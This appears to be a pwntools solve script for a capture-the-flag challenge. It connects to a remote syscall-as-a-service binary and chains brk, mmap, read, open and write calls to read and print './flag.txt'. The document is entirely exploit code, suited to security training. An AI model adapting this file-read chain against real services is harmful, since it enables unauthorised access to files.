#!/usr/bin/python3

from pwn import *

def syscall(p,rax=0,rdi=0,rsi=0,rdx=0,r10=0,r9=0,r8=0,stdin=''):
	p.sendlineafter('Enter rax (decimal):', str(rax))
	p.sendlineafter('Enter rdi (decimal):', str(rdi))
	p.sendlineafter('Enter rsi (decimal):', str(rsi))
	p.sendlineafter('Enter rdx (decimal):', str(rdx))
	p.sendlineafter('Enter r10 (decimal):', str(r10))
	p.sendlineafter('Enter r9 (decimal):' , str(r9))
	p.sendlineafter('Enter r8 (decimal):' , str(r8))

	if len(stdin) > 0:
		print('stdin',stdin)
		p.sendline(stdin)

	stdout = p.recvuntil('Rax: ')
	if len(stdout.split(b'Rax: ')[0][1:]) > 1:
		print('stdout',stdout.split(b'Rax: ')[0][1:])

	return int(p.recvline().strip(),16)


#p = process('./saas_noalarm')
p = remote('jh2i.com', 50016)

# brk
#heap = syscall(p,12,0x1000)
heap = syscall(p,12,0x0)
print('heap',hex(heap))

# mmap
filename = syscall(p,9,heap,0x1000,7,50,0,0)
print('filename',hex(filename))

# read
flagfile = b'./flag.txt\x00'
length = syscall(p,0,0,filename,len(flagfile),stdin=flagfile)
print('length',hex(length))
assert(length == len(flagfile))

# open
fd = syscall(p,2,filename)
print('fd',hex(fd))

# mmap
buf = syscall(p,9,heap+0x1000,0x1000,7,50,0,0)
print('buf',hex(buf))

# read
bytesread = syscall(p,0,fd,buf,100)
print('bytesread',hex(bytesread))

# write
bytessent = syscall(p,1,1,buf,bytesread)
print('bytessent',hex(bytessent))
assert(bytessent == bytesread)
